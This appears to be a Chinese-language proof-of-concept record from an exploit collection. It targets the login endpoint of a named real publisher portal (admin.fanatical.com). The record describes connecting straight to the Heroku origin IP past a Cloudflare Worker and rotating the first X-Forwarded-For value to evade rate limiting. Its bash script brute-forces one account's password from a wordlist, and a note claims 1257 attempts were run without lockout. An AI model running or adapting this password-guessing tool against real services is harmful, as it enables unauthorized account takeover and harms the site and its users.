# Heroku 源站直连 + X-Forwarded-For 首值绕过 IP 限速（Publisher Portal 登录 429→401，无限口令验证）

- **code**: heroku-源站直连-x-forwarded-for-首值绕过-ip-限速-publisher-portal-登录
- **kind**: poc
- **category**: auth-bypass
- **component**: Heroku / Cloudflare Worker / express-rate-limit 类中间件
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 实测：源站直连（--resolve admin.fanatical.com:443:3.33.161.45 + Host: admin.fanatical.com）带 25 个唯一 XFF → 25/25 HTTP 401 无一次 429；同刻不带 XFF 连发 5/5 全 429；XFF 列表「198.51.100.9, <真实IP>」→401 而「<真实IP>, 198.51.100.9」→429，证明限速键取 XFF 首值。经 CF Worker 路径伪造 XFF 无效（Worker 覆盖）。据此完成 1257 次登录尝试无 429/无锁定。
- **path**: pocs/heroku-源站直连-x-forwarded-for-首值绕过-ip-限速-publisher-portal-登录/poc.sh
- **created_at**: 2026-11-11T17:23:09.954Z
- **engine**: https://www.fanatical.com/api/publisher-portal/auth/login（源站 Host: admin.fanatical.com）

## 描述

当 Web 应用（Express/Node 类）部署在 Heroku 且前置 Cloudflare Worker 时：①经 CF 路径的 XFF/X-Real-IP/Forwarded 伪造会被 Worker 覆盖，无效；②但直连 Heroku 路由 IP（--resolve 任意自定义域到 Heroku GA IP + Host 头）可绕过 Worker，此时源站侧限速中间件解析 X-Forwarded-For 首值作为计数键，改 XFF 首值即换新桶。判据：同刻「唯一 XFF 连发不被 429」vs「无 XFF 在 ~20 次内 429」，且 XFF 列表首值位置决定命中哪个桶。

## 用法

```
# 1) 无头对照（应 429）\ncurl -sS -o /dev/null -w "%{http_code}\\n" --noproxy '*' -k --resolve admin.fanatical.com:443:3.33.161.45 -H "Content-Type: application/json" -X POST https://admin.fanatical.com/api/publisher-portal/auth/login -d '{"email":"x@x.com","password":"x"}'\n# 2) 换桶（应 401/业务响应）\ncurl -sS -o /dev/null -w "%{http_code}\\n" --noproxy '*' -k --resolve admin.fanatical.com:443:3.33.161.45 -H "Content-Type: application/json" -H "X-Forwarded-For: 203.0.113.7" -X POST https://admin.fanatical.com/api/publisher-portal/auth/login -d '{"email":"x@x.com","password":"x"}'\n# 3) 首值判据：真实 IP 放首位应 429、伪造 IP 放首位应 401
```

## 正文

```
#!/bin/bash
# Heroku 源站直连 + XFF 首值换桶，做无限制登录尝试
IP=3.33.161.45
HOST=admin.fanatical.com
URL="https://$HOST/api/publisher-portal/auth/login"
EMAIL="$1"
while IFS= read -r pw; do
  xff="198.18.$((RANDOM%250+1)).$((RANDOM%250+1))"
  code=$(curl -sS -m 12 --noproxy '*' -k --resolve "$HOST:443:$IP" \
    -o .one -w "%{http_code}" -H "Content-Type: application/json" \
    -H "X-Forwarded-For: $xff" -X POST "$URL" \
    --data "{\"email\":\"$EMAIL\",\"password\":\"$pw\"}")
  echo "$EMAIL|$pw|$code|$(head -c 80 .one)"
  [ "$code" = "200" ] && break
  sleep 0.05
done < passwords.txt
```
